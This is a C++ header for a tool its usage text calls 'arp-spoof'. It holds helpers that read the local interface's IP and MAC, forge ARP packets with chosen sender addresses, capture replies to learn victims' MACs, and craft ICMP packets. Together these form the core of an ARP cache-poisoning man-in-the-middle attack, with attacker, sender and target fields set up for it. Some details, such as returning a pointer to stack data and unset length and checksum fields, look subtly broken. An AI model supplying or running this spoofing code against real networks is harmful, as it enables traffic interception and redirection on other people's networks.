#pragma once

#include <stdio.h> 
#include <sys/ioctl.h> 
#include <net/if.h> 
#include <string.h> 
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include "ip.h"
#include "mac.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include "icmphdr.h"
#include <pcap.h>

#pragma pack(push, 1)
typedef struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
}EthArpPacket;

typedef struct EthIcmpPacket final {
	EthHdr eth_;
	IpHdr ip_;
	IcmpHdr icmp_;
}EthIcmpPacket;

typedef struct Flow {
	Ip attacker_ip;
	Ip sender_ip;
	Ip target_ip;
	Mac attacker_mac;
	Mac sender_mac;
	Mac target_mac;
	char * interface;
	char * sender;
	char * target;
}Flow;
#pragma pack(pop)

typedef struct {
	char* dev_;
} Param;

void usage() {  
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 4 || argc % 2) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}

Ip myIp(char *interface){
	struct sockaddr_in *addr;
	struct ifreq ifr;
    int s;
	s = socket(AF_INET, SOCK_DGRAM, 0); 
	strncpy(ifr.ifr_name, interface, IFNAMSIZ); 
	
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) { 
		printf("Interface Error"); 
        exit(-1);
	}
    close(s);
	
	addr = (struct sockaddr_in *)&(ifr.ifr_addr);
	return htonl(addr->sin_addr.s_addr);
}

Mac myMac(char *interface){
    struct ifreq ifr;
	int s; 
	
	s = socket(AF_INET, SOCK_DGRAM, 0); 
	strncpy(ifr.ifr_name, interface, IFNAMSIZ); 

	if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) { 
		printf("Interface Error"); 
        exit(-1);
	}
    
    close(s);
    return (unsigned char*)ifr.ifr_hwaddr.sa_data;
}

EthArpPacket* makeArpPacket(Ip& sender_ip, Ip& target_ip, Mac& send_mac, Mac& target_mac, uint16_t op){
	EthArpPacket* packet = (EthArpPacket*)malloc(sizeof(EthArpPacket));

	packet->eth_.dmac_ = target_mac;
	packet->eth_.smac_ = send_mac;
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(op);
	packet->arp_.smac_ = send_mac;
	packet->arp_.sip_ = htonl(sender_ip);
	packet->arp_.tmac_ = target_mac;
	packet->arp_.tip_ = htonl(target_ip);

	return packet;
}

void sendArp(pcap_t* handle, Ip& sender_ip, Ip& target_ip, Mac& send_mac, Mac& target_mac,  uint16_t op){
	EthArpPacket* sendpacket;

	sendpacket = makeArpPacket(sender_ip, target_ip, send_mac, target_mac, op);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(sendpacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	free(sendpacket);
}

Mac getMac(pcap_t* handle, Ip& sender_ip, Ip& target_ip, Mac& target_mac){
	Mac mac;
	struct pcap_pkthdr* header;
	const u_char* packet;
	int res = 0;

	while (true) {
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr* eth = (EthHdr*)(packet);
		ArpHdr* arp = (ArpHdr*)(packet+sizeof(EthHdr));
		if (eth->type() != EthHdr::Arp) continue;

		if (arp->op() != ArpHdr::Reply) continue;

		if (eth->dmac() == target_mac && arp->tip() == target_ip && arp->sip() == sender_ip){
			mac =  eth->smac();	
			break;
		}
	}
	return mac;
}

EthIcmpPacket* makeIcmpPacket(Ip& sender_ip, Ip& target_ip, Mac& send_mac, Mac& target_mac){
	EthIcmpPacket* packet = (EthIcmpPacket*)malloc(sizeof(EthIcmpPacket));

	packet->eth_.dmac_ = target_mac;
	packet->eth_.smac_ = send_mac;
	packet->eth_.type_ = htons(EthHdr::Ip4);

	packet->ip_.ihl_ = 0x05;
	packet->ip_.ver_ = 0x04;
	packet->ip_.tos_ = 0x00;
	packet->ip_.tl_ = sizeof(IpHdr)+sizeof(IcmpHdr);
	packet->ip_.idf_ = 0x00;
	packet->ip_.flgoff_ = 0x00;
	packet->ip_.ttl_ = 64;
	packet->ip_.ptl_ = 0x01;
	packet->ip_.chk_ = 0x00;
	packet->ip_.sip_ = htonl(sender_ip);
	packet->ip_.dip_ = htonl(target_ip);

	packet->icmp_.type_ = 0x00;
	packet->icmp_.code_ = 0x00;
	packet->icmp_.chk_ = 0x00;
	return packet;
}

void sendIcmp(pcap_t* handle, Ip& sender_ip, Ip& target_ip, Mac& send_mac, Mac& target_mac){
	EthIcmpPacket* sendpacket;

	sendpacket = makeIcmpPacket(sender_ip, target_ip, send_mac, target_mac);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(sendpacket), sizeof(EthIcmpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	free(sendpacket);
}